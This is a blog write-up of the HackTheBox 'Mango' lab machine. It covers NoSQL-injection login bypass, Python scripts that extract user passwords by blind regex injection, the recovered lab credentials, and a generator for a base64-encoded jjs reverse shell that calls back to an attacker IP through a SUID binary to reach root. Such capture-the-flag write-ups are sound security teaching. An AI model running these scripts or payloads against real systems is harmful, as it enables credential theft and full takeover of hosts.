<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Mango | TMDeal</title><meta name=keywords content="Hacking"><meta name=description content="Writeup for the Mango lab machine on HackTheBox"><meta name=author content="Trent Deal"><link rel=canonical href=https://TMDeal.github.io/htb/mango/><link crossorigin=anonymous href=/assets/css/stylesheet.f13e5d8a04c00ca4879ab612bea589bf099ebb357d75d728d1c3148170bc2605.css integrity="sha256-8T5digTADKSHmrYSvqWJvwmeuzV9ddco0cMUgXC8JgU=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://TMDeal.github.io/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://TMDeal.github.io/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://TMDeal.github.io/favicon-32x32.png><link rel=apple-touch-icon href=https://TMDeal.github.io/apple-touch-icon.png><link rel=mask-icon href=https://TMDeal.github.io/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><link rel=stylesheet href=https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.2.1/styles/nord.min.css integrity="sha512-igI4zzTHEU3IASS/ojMD7tO6hScqpnEnz41u+xVRNZvZEaF3XaCdre0qZ08frR1hri9+aSNeAXlQz1DS3luvxA==" crossorigin=anonymous referrerpolicy=no-referrer><link rel=manifest href=/site.webmanifest><meta property="og:title" content="Mango"><meta property="og:description" content="Writeup for the Mango lab machine on HackTheBox"><meta property="og:type" content="article"><meta property="og:url" content="https://TMDeal.github.io/htb/mango/"><meta property="og:image" content="https://TMDeal.github.io/htb/mango/images/cover.png"><meta property="article:section" content="htb"><meta property="article:published_time" content="2022-08-08T00:00:00+00:00"><meta property="article:modified_time" content="2022-08-08T00:00:00+00:00"><meta property="og:site_name" content="TMDeal"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://TMDeal.github.io/htb/mango/images/cover.png"><meta name=twitter:title content="Mango"><meta name=twitter:description content="Writeup for the Mango lab machine on HackTheBox"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"HackTheBox","item":"https://TMDeal.github.io/htb/"},{"@type":"ListItem","position":3,"name":"Mango","item":"https://TMDeal.github.io/htb/mango/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Mango","name":"Mango","description":"Writeup for the Mango lab machine on HackTheBox","keywords":["Hacking"],"articleBody":"Introduction This box makes use of sql injection, but not in the way that people normally expect. The box hosts a few different webpages, with one of them being vulnerable to NoSQL injection. The NoSQL injection can be used to harvest user credentials, one of which can be used to ssh into the machine as the mango user. From there, we can login as the admin user with su, and use the jjs SUID binary on the machine to spawn a reverse shell as root.\nEnumeration Nmap # Nmap 7.92 scan initiated Fri Aug 5 15:56:07 2022 as: nmap -sS -sCV -oA scans/nmap/init -Pn 10.10.10.162 Nmap scan report for 10.10.10.162 Host is up (0.022s latency). Not shown: 997 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA) | 256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA) |_ 256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: 403 Forbidden |_http-server-header: Apache/2.4.29 (Ubuntu) 443/tcp open ssl/http Apache httpd 2.4.29 ((Ubuntu)) |_http-title: Mango | Search Base | ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN | Not valid before: 2019-09-27T14:21:19 |_Not valid after: 2020-09-26T14:21:19 |_ssl-date: TLS randomness does not represent time | tls-alpn: |_ http/1.1 |_http-server-header: Apache/2.4.29 (Ubuntu) Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . # Nmap done at Fri Aug 5 15:56:24 2022 -- 1 IP address (1 host up) scanned in 17.07 seconds Websites Nmap shows info about the ssl cert for the website, so we add that information to /etc/hosts. Using gobuster to scan for additional subdomains does not lead to any more results.\nNavigating to http://mango.htb gives a 403 forbidden message, so this is a dead end.\nhttps://mango.htb does, however, load properly. It brings up what looks like a simple websearch, but id does not do anything when a search is made. Checking https://staging-order.mango.htb brings up the same webpage.\nRunning gobuster on the https website shows an endpoint for http://mango.htb/analytics.php.\nThe analytics page itself, does not load any data, since the required license has expired. So this is another dead end.\nhttp://staging-order.mango.htb brings up a login page that does not seem to change on failed login. Probably it is just not showing a proper message to let us know if the login was successful.\nShell as Mango NoSQL Injection Running sqlmap on the login page does not show any fields that are vulnerable to SQL injection. However, NoSQL injection does work, and allows us to bypass authentication.\nPayloadAllTheThings provides all the common NoSQL injection tricks. Intercepting the login request with Burpsuite and putting [$ne] after each POST parameter bypasses login.\nSuccessful login redirects to home.php, which is a placeholder page for a future project\nWhile the actual contents of home.php are not useful, we can still use the NoSQL injection to gather valid user credentials. PayloadsAllTheThings can once again be reference to create some python scripts that will enumerate valid users and their passwords.\n#!/usr/bin/env python3 # search_users.py # verifies a user exists import requests import string u=\"http://staging-order.mango.htb\" headers={'content-type': 'application/x-www-form-urlencoded'} username=sys.argv[1] payload='username[$regex]=^{}\u0026password[$gt]='.format(username) r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False) if r.status_code == 302: print(\"valid user: {}\".format(username)) #!/usr/bin/env python3 # dump_creds.py # Supply a username and it will dump the password of that user the script runs forever, # but once the ending of the password ends in \"$\" over and over again, its done. import sys import urllib.parse import requests import string username=sys.argv[1] password=\"\" u=\"http://staging-order.mango.htb\" headers={'content-type': 'application/x-www-form-urlencoded'} while True: for c in string.printable: if c not in ['*','+','.','?','|']: c = urllib.parse.quote_plus(c) payload='username[$eq]={}\u0026password[$regex]=^{}'.format(username, password + c) r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False) if r.status_code == 302: password += urllib.parse.unquote(c) print(password) Using the search_users.py script, we find two users, admin and mango. Then using the dump_creds.py script we can figure out both of their passwords.\nusername: mango password: h3mXK8RhU~f{]f5H username: admin password: t9KcS3\u003e!0B#2 Attempting to use admin’s credentials to ssh into the machine fails, but mango’s credentials login successfully.\nShell as root Running linpeas shows that openjdk11 is installed and the included binary jjs has the suid bit set. The admin user is also able to run it.\nWe could not ssh into the machine as admin, but attempting to use su and providing the previously obtained password for admin logs in successfully\nThe reason we could not ssh as admin is due to the rules set by sshd_config\nWe can reference gtfobins to find a way to use jjs to get a reverse shell. This works, but the shell we get back is still the admin user. In order for the shell to be a root shell, -p needs to be passed as an argument when executing /bin/bash.\nThe following script can be used to generate a copy-pasteable payload.\n#!/usr/bin/env python3 # gen_payload.py # generates a payload for jjs that can be copy pasted into the target machine. will # create a reverse shell at LHOST:LPORT import base64 LHOST = \"10.10.14.11\" LPORT = 4444 payload = ( 'var ProcessBuilder = Java.type(\"java.lang.ProcessBuilder\");' 'var p=new ProcessBuilder(\"/bin/bash\", \"-i\", \"-p\").redirectErrorStream(true).start();' 'var Socket = Java.type(\"java.net.Socket\");' f'var s=new Socket(\"{LHOST}\",{LPORT});' 'var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();' 'var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()\u003e0)so.write(pi.read()); while(pe.available()\u003e0)so.write(pe.read()); while(si.available()\u003e0)po.write(si.read()); so.flush();po.flush(); Java.type(\"java.lang.Thread\").sleep(50); try {p.exitValue();break;}catch (e){}};p.destroy();s.close();' ) payload = base64.b64encode(payload.encode()) payload = payload.decode(\"utf-8\") print(f\"echo \\\"eval(new java.lang.String(java.util.Base64.decoder.decode('{payload}')));\\\" | jjs\") Copying and pasting the output of the previous script into the shell we have as admin we create a reverse shell on port 4444.\n","wordCount":"908","inLanguage":"en","image":"https://TMDeal.github.io/htb/mango/images/cover.png","datePublished":"2022-08-08T00:00:00Z","dateModified":"2022-08-08T00:00:00Z","author":{"@type":"Person","name":"Trent Deal"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://TMDeal.github.io/htb/mango/"},"publisher":{"@type":"Organization","name":"TMDeal","logo":{"@type":"ImageObject","url":"https://TMDeal.github.io/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://TMDeal.github.io accesskey=h title="TMDeal (Alt + H)">TMDeal</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://TMDeal.github.io/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://TMDeal.github.io/archives/ title=Archives><span>Archives</span></a></li><li><a href=https://TMDeal.github.io/categories/ title=Categories><span>Categories</span></a></li><li><a href=https://TMDeal.github.io/tags/ title=Tags><span>Tags</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://TMDeal.github.io>Home</a>&nbsp;»&nbsp;<a href=https://TMDeal.github.io/htb/>HackTheBox</a></div><h1 class=post-title>Mango</h1><div class=post-meta><span title='2022-08-08 00:00:00 +0000 UTC'>August 8, 2022</span>&nbsp;·&nbsp;Trent Deal</div></header><figure class=entry-cover><img loading=lazy srcset="https://TMDeal.github.io/htb/mango/images/cover.png 300w" sizes="(min-width: 768px) 720px, 100vw" src=https://TMDeal.github.io/htb/mango/images/cover.png alt=Mango width=300 height=300></figure><div class=post-content><h1 id=introduction>Introduction<a hidden class=anchor aria-hidden=true href=#introduction>#</a></h1><p>This box makes use of sql injection, but not in the way that people normally expect.
The box hosts a few different webpages, with one of them being vulnerable to NoSQL
injection. The NoSQL injection can be used to harvest user credentials, one of which
can be used to ssh into the machine as the mango user. From there, we can login as
the admin user with <code>su</code>, and use the <code>jjs</code> SUID binary on the machine to spawn a
reverse shell as root.</p><h2 id=enumeration>Enumeration<a hidden class=anchor aria-hidden=true href=#enumeration>#</a></h2><h3 id=nmap>Nmap<a hidden class=anchor aria-hidden=true href=#nmap>#</a></h3><pre tabindex=0><code class=language-nohighlight data-lang=nohighlight># Nmap 7.92 scan initiated Fri Aug  5 15:56:07 2022 as: nmap -sS -sCV -oA scans/nmap/init -Pn 10.10.10.162
Nmap scan report for 10.10.10.162
Host is up (0.022s latency).
Not shown: 997 closed tcp ports (reset)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-title: 403 Forbidden
|_http-server-header: Apache/2.4.29 (Ubuntu)
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Aug  5 15:56:24 2022 -- 1 IP address (1 host up) scanned in 17.07 seconds
</code></pre><h3 id=websites>Websites<a hidden class=anchor aria-hidden=true href=#websites>#</a></h3><p>Nmap shows info about the ssl cert for the website, so we add that information to
/etc/hosts. Using gobuster to scan for additional subdomains does not lead to any
more results.</p><p><img loading=lazy src=./images/website/etc_host.png alt=/etc/hosts>
<img loading=lazy src=./images/website/gobuster_vhosts.png alt="gobuster vhosts"></p><p>Navigating to <a href=http://mango.htb>http://mango.htb</a> gives a 403 forbidden message, so this is a dead end.</p><p><img loading=lazy src=./images/website/http/mango_htb/403_forbidden.png alt=mango.htb></p><p><a href=https://mango.htb>https://mango.htb</a> does, however, load properly. It brings up what looks like a simple
websearch, but id does not do anything when a search is made. Checking
<a href=https://staging-order.mango.htb>https://staging-order.mango.htb</a> brings up the same webpage.</p><p><img loading=lazy src=./images/website/https/mango_htb/homepage.png alt=https://mango.htb></p><p>Running gobuster on the https website shows an endpoint for
<a href=http://mango.htb/analytics.php>http://mango.htb/analytics.php</a>.</p><p><img loading=lazy src=./images/website/https/mango_htb/gobuster.png alt=Gobuster></p><p>The analytics page itself, does not load any data, since the required license has
expired. So this is another dead end.</p><p><img loading=lazy src=./images/website/https/mango_htb/analytics_page.png alt=analytics></p><p><a href=http://staging-order.mango.htb>http://staging-order.mango.htb</a> brings up a login page that does not seem to change on
failed login. Probably it is just not showing a proper message to let us know if the
login was successful.</p><p><img loading=lazy src=./images/website/http/mango_htb/staging-order/homepage.png alt=staging-order.mango.htb></p><h2 id=shell-as-mango>Shell as Mango<a hidden class=anchor aria-hidden=true href=#shell-as-mango>#</a></h2><h3 id=nosql-injection>NoSQL Injection<a hidden class=anchor aria-hidden=true href=#nosql-injection>#</a></h3><p>Running sqlmap on the login page does not show any fields that are vulnerable to
SQL injection. However, NoSQL injection does work, and allows us to bypass
authentication.</p><p><a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#authentication-bypass>PayloadAllTheThings</a> provides all the common NoSQL injection tricks. Intercepting the login request with Burpsuite and putting <code>[$ne]</code> after each POST parameter bypasses login.</p><p><img loading=lazy src=./images/website/http/mango_htb/staging-order/nosql_injection.png alt="nosql injection"></p><p>Successful login redirects to home.php, which is a placeholder page for a future
project</p><p><img loading=lazy src=./images/website/http/mango_htb/staging-order/home.png alt=home.php></p><p>While the actual contents of home.php are not useful, we can still use the NoSQL
injection to gather valid user credentials.
<a href=https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection#blind-nosql>PayloadsAllTheThings</a>
can once again be reference to create some python scripts that will enumerate valid
users and their passwords.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span><span style=color:#75715e># search_users.py</span>
</span></span><span style=display:flex><span><span style=color:#75715e># verifies a user exists</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> string
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>u<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://staging-order.mango.htb&#34;</span>
</span></span><span style=display:flex><span>headers<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#39;content-type&#39;</span>: <span style=color:#e6db74>&#39;application/x-www-form-urlencoded&#39;</span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>username<span style=color:#f92672>=</span>sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;username[$regex]=^</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&amp;password[$gt]=&#39;</span><span style=color:#f92672>.</span>format(username)
</span></span><span style=display:flex><span>r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(u, data <span style=color:#f92672>=</span> payload, headers <span style=color:#f92672>=</span> headers, verify <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>, allow_redirects <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> r<span style=color:#f92672>.</span>status_code <span style=color:#f92672>==</span> <span style=color:#ae81ff>302</span>:
</span></span><span style=display:flex><span>    print(<span style=color:#e6db74>&#34;valid user: </span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#34;</span><span style=color:#f92672>.</span>format(username))
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span><span style=color:#75715e># dump_creds.py</span>
</span></span><span style=display:flex><span><span style=color:#75715e># Supply a username and it will dump the password of that user the script runs forever,</span>
</span></span><span style=display:flex><span><span style=color:#75715e># but once the ending of the password ends in &#34;$&#34; over and over again, its done.</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> sys
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> urllib.parse
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> requests
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> string
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>username<span style=color:#f92672>=</span>sys<span style=color:#f92672>.</span>argv[<span style=color:#ae81ff>1</span>]
</span></span><span style=display:flex><span>password<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>u<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;http://staging-order.mango.htb&#34;</span>
</span></span><span style=display:flex><span>headers<span style=color:#f92672>=</span>{<span style=color:#e6db74>&#39;content-type&#39;</span>: <span style=color:#e6db74>&#39;application/x-www-form-urlencoded&#39;</span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>while</span> <span style=color:#66d9ef>True</span>:
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> c <span style=color:#f92672>in</span> string<span style=color:#f92672>.</span>printable:
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> c <span style=color:#f92672>not</span> <span style=color:#f92672>in</span> [<span style=color:#e6db74>&#39;*&#39;</span>,<span style=color:#e6db74>&#39;+&#39;</span>,<span style=color:#e6db74>&#39;.&#39;</span>,<span style=color:#e6db74>&#39;?&#39;</span>,<span style=color:#e6db74>&#39;|&#39;</span>]:
</span></span><span style=display:flex><span>            c <span style=color:#f92672>=</span> urllib<span style=color:#f92672>.</span>parse<span style=color:#f92672>.</span>quote_plus(c)
</span></span><span style=display:flex><span>            payload<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;username[$eq]=</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&amp;password[$regex]=^</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>&#39;</span><span style=color:#f92672>.</span>format(username, password <span style=color:#f92672>+</span> c)
</span></span><span style=display:flex><span>            r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>post(u, data <span style=color:#f92672>=</span> payload, headers <span style=color:#f92672>=</span> headers, verify <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>, allow_redirects <span style=color:#f92672>=</span> <span style=color:#66d9ef>False</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> r<span style=color:#f92672>.</span>status_code <span style=color:#f92672>==</span> <span style=color:#ae81ff>302</span>:
</span></span><span style=display:flex><span>                password <span style=color:#f92672>+=</span> urllib<span style=color:#f92672>.</span>parse<span style=color:#f92672>.</span>unquote(c)
</span></span><span style=display:flex><span>                print(password)
</span></span></code></pre></div><p>Using the search_users.py script, we find two users, admin and mango. Then using the
dump_creds.py script we can figure out both of their passwords.</p><pre tabindex=0><code class=language-nohighlight data-lang=nohighlight>username: mango
password: h3mXK8RhU~f{]f5H
</code></pre><pre tabindex=0><code class=language-nohighlight data-lang=nohighlight>username: admin
password: t9KcS3&gt;!0B#2
</code></pre><p>Attempting to use admin&rsquo;s credentials to ssh into the machine fails, but mango&rsquo;s
credentials login successfully.</p><p><img loading=lazy src=./images/shell_as_mango.png alt="Shell as mango"></p><h2 id=shell-as-root>Shell as root<a hidden class=anchor aria-hidden=true href=#shell-as-root>#</a></h2><p>Running linpeas shows that openjdk11 is installed and the included binary jjs has the
suid bit set. The admin user is also able to run it.</p><p><img loading=lazy src=./images/java/linpeas_suid.png alt="linpeas suid on jjs"></p><p>We could not ssh into the machine as admin, but attempting to use <code>su</code> and providing
the previously obtained password for admin logs in successfully</p><p><img loading=lazy src=./images/shell_as_admin.png alt="shell as admin">
<img loading=lazy src=./images/user_get.png alt=user.txt></p><p>The reason we could not ssh as admin is due to the rules set by sshd_config</p><p><img loading=lazy src=./images/ssh/allowed_users.png alt=sshd_config></p><p>We can reference <a href=https://gtfobins.github.io/gtfobins/jjs/#reverse-shell>gtfobins</a>
to find a way to use <code>jjs</code> to get a reverse shell. This works, but the shell we get
back is still the admin user. In order for the shell to be a root shell, <code>-p</code> needs
to be passed as an argument when executing <code>/bin/bash</code>.</p><p><img loading=lazy src=./images/java/bash_arguments.png alt="bash -p flag"></p><p>The following script can be used to generate a copy-pasteable payload.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#75715e>#!/usr/bin/env python3</span>
</span></span><span style=display:flex><span><span style=color:#75715e># gen_payload.py</span>
</span></span><span style=display:flex><span><span style=color:#75715e># generates a payload for jjs that can be copy pasted into the target machine. will</span>
</span></span><span style=display:flex><span><span style=color:#75715e># create a reverse shell at LHOST:LPORT</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> base64
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>LHOST <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;10.10.14.11&#34;</span>
</span></span><span style=display:flex><span>LPORT <span style=color:#f92672>=</span> <span style=color:#ae81ff>4444</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> (
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;var ProcessBuilder = Java.type(&#34;java.lang.ProcessBuilder&#34;);&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;var p=new ProcessBuilder(&#34;/bin/bash&#34;, &#34;-i&#34;, &#34;-p&#34;).redirectErrorStream(true).start();&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;var Socket = Java.type(&#34;java.net.Socket&#34;);&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>f</span><span style=color:#e6db74>&#39;var s=new Socket(&#34;</span><span style=color:#e6db74>{</span>LHOST<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;,</span><span style=color:#e6db74>{</span>LPORT<span style=color:#e6db74>}</span><span style=color:#e6db74>);&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;var pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();&#39;</span>
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#39;var po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){ while(pi.available()&gt;0)so.write(pi.read()); while(pe.available()&gt;0)so.write(pe.read()); while(si.available()&gt;0)po.write(si.read()); so.flush();po.flush(); Java.type(&#34;java.lang.Thread&#34;).sleep(50); try {p.exitValue();break;}catch (e)</span><span style=color:#e6db74>{}</span><span style=color:#e6db74>};p.destroy();s.close();&#39;</span>
</span></span><span style=display:flex><span>)
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> base64<span style=color:#f92672>.</span>b64encode(payload<span style=color:#f92672>.</span>encode())
</span></span><span style=display:flex><span>payload <span style=color:#f92672>=</span> payload<span style=color:#f92672>.</span>decode(<span style=color:#e6db74>&#34;utf-8&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;echo </span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74>eval(new java.lang.String(java.util.Base64.decoder.decode(&#39;</span><span style=color:#e6db74>{</span>payload<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;)));</span><span style=color:#ae81ff>\&#34;</span><span style=color:#e6db74> | jjs&#34;</span>)
</span></span></code></pre></div><p>Copying and pasting the output of the previous script into the shell we have as admin
we create a reverse shell on port 4444.</p><p><img loading=lazy src=./images/shell_as_root.png alt="Shell as root">
<img loading=lazy src=./images/root_get.png alt=root.txt></p></div><footer class=post-footer><ul class=post-tags><li><a href=https://TMDeal.github.io/tags/hacking/>Hacking</a></li></ul><nav class=paginav><a class=next href=https://TMDeal.github.io/htb/forge/><span class=title>Next »</span><br><span>Forge</span></a></nav><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Mango on twitter" href="https://twitter.com/intent/tweet/?text=Mango&url=https%3a%2f%2fTMDeal.github.io%2fhtb%2fmango%2f&hashtags=Hacking"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Mango on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2fTMDeal.github.io%2fhtb%2fmango%2f&title=Mango&summary=Mango&source=https%3a%2f%2fTMDeal.github.io%2fhtb%2fmango%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentcolor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" 